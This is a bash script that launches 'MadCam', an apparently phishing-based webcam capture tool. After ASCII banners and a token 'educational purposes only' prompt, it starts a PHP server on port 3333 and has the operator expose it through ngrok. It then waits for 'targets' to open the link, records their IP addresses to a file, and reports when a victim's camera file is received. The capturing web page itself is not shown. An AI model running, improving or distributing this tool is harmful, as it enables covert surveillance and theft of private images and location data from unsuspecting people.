#!/bin/bash
# If you use any part from this code, giving me the credits. Read the Lincense!
# Modified By <Mr. MAD BHAI>
clear
printf "\n"
printf "\n"
printf "\n"
echo '
                              mmmm
                        so++++oooooo++++osydmM
                   +ooyhdmNNNNNNNNNNNNmmhyoo++oy
               +oydmNMMMNmdhyysoooosyyhdmNMMMNmdyo++
           +ymNMMMMMds/-.`            `.-/sdMMMMMNmy+
         +dNMNmmMNy:.                      .:yNMmmNMNd+
         /hNNMddNMd:..                        ..:dMNddMNNh/
        +mNdNdmMMd.-.                          .-.dMMmdNdNm+
       NNhNNdMMM:--`     𝐌ʳ. 𝐦𝓐𝓓 ⓑｈⓐι     --:MMMdNNyNN/
      mMsdMhNMMd.--                            --.dMMNhMdsMm:
     yMhoNMdMMMh-:-`                          `-:-hMMMdMNohMy:
     NN/hMMMMMMmshhhy+`                    `+yhhhsmMMMMMMh/NN//
    yMmdMNMMMMMMNy:----                    ----:yNMMMMMMNMdmMy-
    NMMNhyMNMMMN/`:shdds:`              `:sddhs:`/NMMMNMyhNMMN//
  +MNmMdsyMdMMM+`+hMMMMMMd+.  `-  -`  .+dMMMMMMh+`+MMMdMysdMmNM+:
  hMydMd:/MhMMM``.hMMMMMMMMNdyym``myydNMMMMMMMMh.``MMMhM/:dMdyMh-
  dMssMd++MhMMM/ `dyMMMNITIMMMMMMM::::MM NITIMMMyd` /MMMhM++dMssMd-
  dMdNMdmNMhNMMMo.:ssMMMMMMMMMy:MM:yMMMMMMMMMss:.oMMMNhMNmdMNdMd-
  hMdMMmmMMddMMy   `./ydmmdmMs.mMMm.sMmdmmdy/.`   yMMddMMmmMMdMh-
  sMmmMNdMMNhMM:`     `..-+/.:mMddMm:.//-..`     `:MMhNMMdNMmmMs-
    MMMMyNMMhMMs-`         ``+NN::NN+``         `-sMMhMMNyMMMMm//
       MMNmMMMMMdo:/osys:     `.--.`     :syso/:odMMMMMmmMMds+/
         shdmNMMMMMNMMMmmd/      ``      /dmmMMMNMMMMMNmNhy//
             :mMMmMMy:-`                `-:yMMmMMm://:dh+:
               hMMhNMdo.+-..`` ```` ``..-+.odMNhMMh-yy-dh+:
               yMModdM. y`-s`:y.//.y:`s-`y -MddoMMy-h+:Nh:+
                yMM/ooMmdd/oo :o -- o: oo/ddmMoo/MMy-+:hms:
                hMM:.-oNdhNmNdmh/ss/hmdNmNhdNo-.:MMh-/hms:
                MM:. /+`h.h:/madbhai/:h.h`+/`-:/MMdymd+/
                   Mh/`  ..+.h.-y // y-.h.+..-hhNNMNdh+/
                   Nh+-`  `..-+.//.+-..`  `/dmMMMo/  
                      h+-``          ``-+hmNhyy+/  
                     smNmh+-````````-+hmNms++yh  
                       hdsmyo+oo+oymuwqmkdwa     
                             NNNNNNNN 
                  ---------------------------------  
                 !!        𝐌ʳ. 𝐦𝓐𝓓 ⓑｈⓐι       !! 
                  ---------------------------------                  ' | lolcat
sleep 5
clear
echo "                YOU HAVE TO SETUP NGROK MANUALLY 
               OTHERWISE YOU WILL NOT WAN LINK...!"
sleep 3
clear
read -p $'EDUCATIONAl PURPOSES ONLY ? \e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m (Y/N) : \e[0m' option
echo ""
clear

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi
if [[ $option == *'No'* ]]; then
clear
exit
fi
if [[ $option == *'nO'* ]]; then
clear
exit
fi
if [[ $option == *'no'* ]]; then
clear
exit
fi
if [[ $option == *'NO'* ]]; then
clear
exit
fi

trap 'printf "\n";stop' 2

banner() {

echo '
           ___        .---------.._
    ______!gnm!_....-" .g8888888p. "-------....._
  ."          //     .g8:       :8p..---....___ \".
  | MADCAM   //  ()  d88:       :88b|==========! !|
  |  V2.0   //       888:       :888|==========| !|
  |___      \\_______"T88888888888P""----------"//|   
  |   \       """"""""""""""""""""""""""""""""""/ |   
  |    !...._____      .="""=.   .[]    ____...!  |   
  |   / This Tool     ! .g$p. !   .[]          :  |   
  |  ! is Reborn as  :  $$$$$  :  .[]          :  |   
  |  !    MadCam      ! "T$P" !   .[]           . |   
  |   \__              "=._.="   .()        __    |   
  |.--'  '----._______________________.----'  '--.|
  ".________________MR._MAD_BHAI_________________." ' |lolcat
                                                                              
echo " "
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]Tool link  :\e[0m\e[1;77m %s\e[0m\n https://www.github.com/MrMadBhai/MadCam"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]Instagram ID :\e[0m\e[1;77m %s\e[0m\n https://www.instagram.com/MrMadBhai"
printf "\n"

}

stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
echo ""
echo '
     ---------------------------   
   !      CAM FILE RECEIVED      ! 
     ---------------------------   ' | lolcat
rm -rf Log.log
fi
sleep 0.5

done 

}


local_server() {


echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo ""
php -S localhost:3333 > /dev/null 2>&1 & 
sleep 2
echo "Loalhost: 127.0.0.1:3333"
echo ""
echo "You have to start ngrok manually on port 3333"
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option [DEFAULT IS 1]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 1 ]]; then
local_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}

banner
dependencies
start1

